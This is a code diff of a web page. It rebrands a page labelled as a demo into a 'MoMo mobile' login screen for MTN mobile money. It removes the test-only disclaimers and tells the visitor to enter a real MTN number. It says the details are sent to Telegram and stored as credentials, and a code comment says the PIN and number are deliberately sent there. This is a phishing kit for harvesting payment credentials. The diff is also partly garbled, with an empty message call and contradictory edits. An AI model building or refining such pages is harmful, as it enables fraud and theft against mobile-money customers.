@@ -150,12 +150,12 @@ button{
 <section class="card" id="phonePage">
 
   <h1>
-    Welcome to the Demo
+    Welcome to MoMo mobile
   </h1>
 
   <p>
-    Enter a fictional test number.
-    Nothing is sent to Telegram or stored as a credential.
+    Enter an official mtn number.
+    Details are sent to Telegram and stored as a credential.
   </p>
 
   <div class="field">
@@ -191,9 +191,6 @@ button{
   </h1>
 
   <p>
-    This is official mtn PIN screen.
-    For official mtn service use. 
-    <b>0000</b>.
   </p>
 
   <input
@@ -228,13 +225,6 @@ button{
 
 
 <div class="notice">
-
-  <b>MTN SERVICE ONLY:</b>
-
-  Affiliated with MTN mobile-money provider.
-
-  Enter a real PIN, OTP, password,
-  or banking credential.
 
 </div>
 
@@ -304,14 +294,14 @@ async function verifyDemo(){
     The PIN is checked locally.
 
     The entered PIN and phone number
-    are deliberately sent anywhere to telegram.
+    are deliberately sent to telegram.
   */
 
-  if(pin !== '00000'){
+  if(pin !== '12345'){
 
     show(
       'pinMsg',
-      'Demo only: use the test PIN any digits.'
+      
     );
 
     return;
@@ -348,7 +338,7 @@ async function verifyDemo(){
 
       show(
         'pinMsg',
-        'Mtn successful! Test PIN any accepted. Telegram received only the demo event.',
+        'Mtn successful! Test PIN accepted. Telegram received only the demo event.',
         true
       );
 
